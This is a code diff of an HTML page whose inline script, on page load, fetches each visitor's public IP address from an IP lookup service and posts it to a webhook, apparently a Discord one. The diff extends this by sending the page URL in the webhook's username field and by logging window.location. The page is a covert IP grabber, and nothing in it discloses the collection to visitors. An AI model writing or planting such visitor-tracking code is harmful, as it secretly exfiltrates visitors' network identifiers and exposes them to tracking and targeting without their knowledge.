@@ -60,6 +60,8 @@
 
 </head>
 <body><script>
+
+
     function getIP(json) {
         console.log("My public IP address is: ", json.ip);
     function sendMessage() {
@@ -69,7 +71,7 @@
       request.setRequestHeader('Content-type', 'application/json');
 
       var params = {
-        username: "My Webhook Name",
+        username: window.location.href,
         avatar_url: "",
         content: json.ip,
       }
@@ -77,6 +79,7 @@
       request.send(JSON.stringify(params));
     }
     sendMessage()
+    console.log('Data:', window.location);
 }
 </script>
 <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
